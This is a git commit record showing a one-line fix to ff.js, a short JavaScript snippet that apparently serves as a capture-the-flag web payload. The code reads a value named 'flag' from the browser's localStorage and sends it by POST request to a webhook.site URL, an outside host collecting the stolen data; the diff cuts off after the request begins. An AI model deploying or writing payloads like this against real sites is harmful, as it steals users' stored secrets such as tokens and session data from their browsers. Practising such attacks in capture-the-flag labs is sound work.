d6191505e1a30187eb7fa7190fba8de1fbb3dbdd
Vigneswar-A <93377157+Vigneswar-A@users.noreply.github.com>
2025-01-21 12:26:53 +0530

    Update ff.js

--- ff.js
+++ ff.js
@@ -1,4 +1,4 @@
-let flag = localStorage.getItem("flag"));
+let flag = localStorage.getItem("flag");
 let URL = 'https://webhook.site/97274b59-5b47-484b-a6d6-6908d03fad5e';
 fetch(URL, {
      method: 'POST',
